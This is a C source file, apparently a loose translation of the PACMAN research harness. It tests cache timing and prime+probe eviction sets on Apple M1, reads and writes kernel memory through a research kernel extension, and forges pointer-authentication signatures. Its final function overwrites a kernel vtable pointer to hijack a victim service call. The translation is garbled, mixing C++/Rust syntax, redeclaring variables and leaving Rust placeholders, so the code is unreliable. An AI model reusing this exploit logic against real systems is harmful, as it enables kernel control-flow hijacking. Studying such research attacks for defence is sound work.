#include <stdio.h>
#include <stdint.h>
#include <time.h>

// Define constants if needed
#define PAC_BITMASK 0x8000000000000000ULL

// Define structs and types if needed

// Function prototypes
void test_timers(uint8_t *shared_mem);
void data_ev_set_test(uint8_t *shared_mem);
void inst_pev_set_test(uint8_t *shared_mem);
void test_pacmankit();
void test_forge_pacs();

volatile uint64_t CTR;

// Function implementations
void test_timers(uint8_t *shared_mem) {
    uint64_t x = 0;

    // Get the current time before the loop
    struct timespec t1_mach;
    clock_gettime(CLOCK_MONOTONIC, &t1_mach);
    uint64_t t1 = CTR;

    for (int i = 0; i < 1000; i++) {
        x = i / 2 + x;
    }
    
    struct timespec t2_mach;
    clock_gettime(CLOCK_MONOTONIC, &t2_mach);
    uint64_t t2 = CTR;

    // Calculate time differences
    uint64_t time_difference_thread = t2 - t1;
    uint64_t time_difference_mach = (t2_mach.tv_sec - t1_mach.tv_sec) * 1000000000 + (t2_mach.tv_nsec - t1_mach.tv_nsec);

    printf("Time difference (thread): %llu\n", time_difference_thread);
    printf("Time difference (mach): %llu\n", time_difference_mach);
    printf("%llu\n", x);
}

void data_ev_set_test(uint8_t *shared_mem) {
    if (!set_core(CoreKind::PCORE)) {
        printf("Error setting CPU affinity!\n");
        return;
    }

    // Call data_evset function
    DataEvSet evset = data_evset(&shared_mem[0], shared_mem);

    // Demonstrate eviction of shared_mem[0]
    printf("reading 0x%p twice\n", (void *)&shared_mem[0]);
    uint64_t t0 = read_counter();
    read_volatile(&shared_mem[0]);
    uint64_t t1 = read_counter();
    read_volatile(&shared_mem[0]);
    uint64_t t2 = read_counter();

    for (size_t i = 0; i < evset.size; i++) {
        read_volatile(evset.addrs[i]);
        // printf("evicting 0x%p\n", (void *)evset.addrs[i]);
    }

    printf("reading 0x%p\n", (void *)&shared_mem[0]);
    uint64_t t1_2 = read_counter();
    read_volatile(&shared_mem[0]);
    uint64_t t2_2 = read_counter();

    printf("Time difference (uncached): %llu\n", t1 - t0);
    printf("Time difference (cached): %llu\n", t2 - t1);
    printf("Time difference (post-eviction): %llu\n", t2_2 - t1_2);

    printf("=========================\n");

    // Now we show prime probe
    // prime
    for (size_t i = 0; i < evset.size; i++) {
        read_volatile(evset.addrs[i]);
    }

    // evict(?)
    // for (int i = 0; i < 1000; i++) {
    //     read_volatile(&shared_mem[0]);
    // }

    uint64_t results[0x10000];
    size_t cur_idx = 0;

    // probe
    for (size_t i = 0; i < evset.size; i++) {
        asm volatile("isb");
        uint64_t t1_3 = read_counter();
        read_volatile(evset.addrs[i]);
        uint64_t t2_3 = read_counter();
        results[cur_idx] = t2_3 - t1_3;
        cur_idx++;
    }

    printf("prime+probe Results\n");
    printf("[ ] == Empty, [X] == Cached\n");
    size_t num_miss = 0;

    for (size_t idx = 0; idx < evset.size; idx++) {
        if (results[idx] >= 50) {
            printf("[ ] %llu\n", results[idx]);
            num_miss++;
        } else {
            printf("[X] %llu\n", results[idx]);
        }
    }

    printf("%zu / %zu\n", num_miss, evset.size);
}

void inst_pev_set_test(uint8_t *shared_mem) {
    // Assuming the Rust functions inst_pevset, read_counter, and PacmanKitConnection::init are available
    // (replace with C equivalent if needed)
    // Let's define inst_pevset, read_counter, and PacmanKitConnection as placeholders

    PacmanKitConnection handle;

    if (!handle.init()) {
        printf("Couldn't connect to PacmanKit\n");
        return;
    }

    uint8_t *kernel_mmap_va = handle.kernel_mmap();

    if (!kernel_mmap_va) {
        printf("Couldn't call IOMalloc in the kernel!\n");
        return;
    }

    uint64_t kernel_mmap_pa = handle.kernel_virt_to_phys(kernel_mmap_va);

    if (!kernel_mmap_pa) {
        printf("Error: Kernel virtual to physical translation failed\n");
        return;
    }

    uint32_t target_set = cache_get_cache_set_m1(kernel_mmap_pa);
    printf("Kernel mmap VA: 0x%p\n", (void *)kernel_mmap_va);
    printf("            PA: 0x%llX\n", kernel_mmap_pa);
    printf("Generating eviction set to match address with L2 set %u...\n", target_set);

    // Call inst_pevset function
    InstPevSet evset = inst_pevset(kernel_mmap_va, kernel_mmap_pa, shared_mem);

    printf("Found %zu conflicts.\n", evset.size);
    printf("%p\n", (void *)evset.addrs[0]);

    void (*retpoline_fn)() = (void (*)())evset.addrs[0];
    printf("Calling 0x%p\n", (void *)evset.addrs[0]);

    uint64_t t1 = read_counter();
    asm volatile("isb");
    retpoline_fn();
    asm volatile("isb");
    uint64_t t2 = read_counter();
    asm volatile("isb");
    retpoline_fn();
    asm volatile("isb");
    uint64_t t3 = read_counter();

    for (size_t i = 0; i < evset.size; i++) {
        void (*retpoline_entry)() = (void (*)())evset.addrs[i];
        printf("Calling 0x%p\n", (void *)evset.addrs[i]);
        asm volatile("isb");
        retpoline_entry();
        asm volatile("isb");
    }

    uint64_t t1_2 = read_counter();
    asm volatile("isb");
    retpoline_fn();
    asm volatile("isb");
    uint64_t t2_2 = read_counter();

    printf("Uncached execution time: %llu\n", t2 - t1);
    printf("Cached execution time: %llu\n", t3 - t2);
    printf("Post eviction execution time: %llu\n", t2_2 - t1_2);
}

void test_pacmankit() {
    // Assuming the Rust functions PacmanKitConnection::init, PacmanKitConnection::kernel_base, PacmanKitConnection::kernel_read are available
    // (replace with C equivalent if needed)
    // Let's define PacmanKitConnection, init, kernel_base, and kernel_read as placeholders

    PacmanKitConnection handle;

    if (!handle.init()) {
        printf("Couldn't connect to PacmanKit\n");
        return;
    }

    uint64_t kernel_base = handle.kernel_base();

    if (!kernel_base) {
        printf("Error: Failed to get kernel base address\n");
        return;
    }

    printf("Kernel base is at 0x%llX\n", kernel_base);
    printf("Kernel base contains 0x%llX\n", handle.kernel_read(kernel_base));
    // handle.kernel_write(kernel_base, 0x4141414141414141);
    handle.kernel_write(kernel_base, 0x100000CFEEDFACF);
    printf("Kernel base contains 0x%llX\n", handle.kernel_read(kernel_base));
    printf("Kernel base is at 0x%llX\n", handle.kernel_virt_to_phys(kernel_base));
    uint64_t user_addr = (uint64_t)&handle;
    printf("User address 0x%llX has physical address 0x%llX\n", user_addr, handle.user_virt_to_phys(user_addr));
    printf("Handle is at 0x%llX\n", handle.get_handle_loc());

    uint64_t cache_test_addr = 0x17F;
    printf("Offset is %u\n", get_cache_offset_m1(cache_test_addr));
    printf("Set is 0x%X\n", get_cache_set_m1(cache_test_addr));
    printf("Tag is 0x%X\n", get_cache_tag_m1(cache_test_addr));

    uint8_t *kern_mmap_ptr = handle.kernel_mmap();

    if (!kern_mmap_ptr) {
        printf("Failed to allocate kernel memory!\n");
        return;
    }

    printf("Got a pointer at 0x%p\n", (void *)kern_mmap_ptr);

    handle.kernel_free();
}

void test_forge_pacs() {
    // Assuming the Rust functions PacmanKitConnection::init, PacmanKitConnection::forge_sign_data, PacmanKitConnection::forge_sign_inst, PacmanKitConnection::leak_win, PacmanKitConnection::kernel_exec_for_timing, PacmanKitConnection::call_service_routine are available
    // (replace with C equivalent if needed)
    // Let's define PacmanKitConnection, init, forge_sign_data, forge_sign_inst, leak_win, kernel_exec_for_timing, and call_service_routine as placeholders

    PacmanKitConnection handle;

    if (!handle.init()) {
        printf("Couldn't connect to PacmanKit\n");
        return;
    }

    // Victim handle gives us a victim IOUserClient to exploit
    PacmanKitConnection victim_handle;

    if (!victim_handle.init()) {
        printf("Couldn't connect to PacmanKit\n");
        return;
    }

    uint64_t iouserclient_base = victim_handle.get_handle_loc();
    uint64_t pacmankitservice = iouserclient_base + pacmankit::PACMANKIT_TO_HELPER;
    uint64_t pacmankitservice_vtable = handle.kernel_read(pacmankitservice);
    uint64_t pacmankitservice_vtable_masked = pacmankitservice_vtable | PAC_BITMASK;
    uint64_t pacmankitservice_externalMethod = handle.kernel_read(pacmankitservice_vtable);
    uint64_t pacmankitservice_externalMethod_masked = pacmankitservice_externalMethod | PAC_BITMASK;

    printf("IOService is at 0x%llX\n", iouserclient_base);
    printf("PacmanKitService is at 0x%llX\n", pacmankitservice);
    printf("PacmanKitService`vtable is at 0x%llX\n", pacmankitservice_vtable_masked);
    printf("PacmanKitService`vtable signed is 0x%llX\n", pacmankitservice_vtable);
    printf("PacmanKitService`externalMethod signed is 0x%llX\n", pacmankitservice_externalMethod);

    uint64_t salt_data = get_salt(pacmankitservice | PAC_BITMASK, 0xd986);
    uint64_t salt_inst = get_salt(pacmankitservice_vtable | PAC_BITMASK, 0xa7d5);

    for (int i = 0; i < 1000; i++) {
        uint64_t forged_vtable_ptr = handle.forge_sign_data(pacmankitservice_vtable_masked, salt_data);
        uint64_t forged_vtable_entry = handle.forge_sign_inst(pacmankitservice_externalMethod_masked, salt_inst);
        printf("Forge-signed vtable is 0x%llX\n", forged_vtable_ptr);
        printf("Forge-signed externalMethod is 0x%llX\n", forged_vtable_entry);
        assert(forged_vtable_ptr == pacmankitservice_vtable);
        assert(forged_vtable_entry == pacmankitservice_externalMethod);
    }

    uint64_t win_ptr = handle.leak_win();

    // Manually call win:
    // handle.kernel_exec_for_timing(win_ptr, true);

    // Forge vtable with mmap region and use that to call win:
    uint8_t *kernel_mmap = handle.kernel_mmap();

    if (!kernel_mmap) {
        printf("Failed to allocate kernel memory!\n");
        return;
    }

    uint64_t salt_data = get_salt(pacmankitservice | PAC_BITMASK, 0xd986);
    uint64_t salt_inst = get_salt(kernel_mmap | PAC_BITMASK, 0xa7d5);
    uint64_t new_vtable_ptr = handle.forge_sign_data(kernel_mmap, salt_data);
    uint64_t new_vtable_entry = handle.forge_sign_inst(win_ptr, salt_inst);

    handle.kernel_write(kernel_mmap | PAC_BITMASK, new_vtable_entry);
    handle.kernel_write(pacmankitservice | PAC_BITMASK, new_vtable_ptr);

    // This should not be redirected...
    handle.call_service_routine(0, 1, 2, 3, 4, 5);

    // And this one should be redirected!
    victim_handle.call_service_routine(0, 1, 2, 3, 4, 5);
}
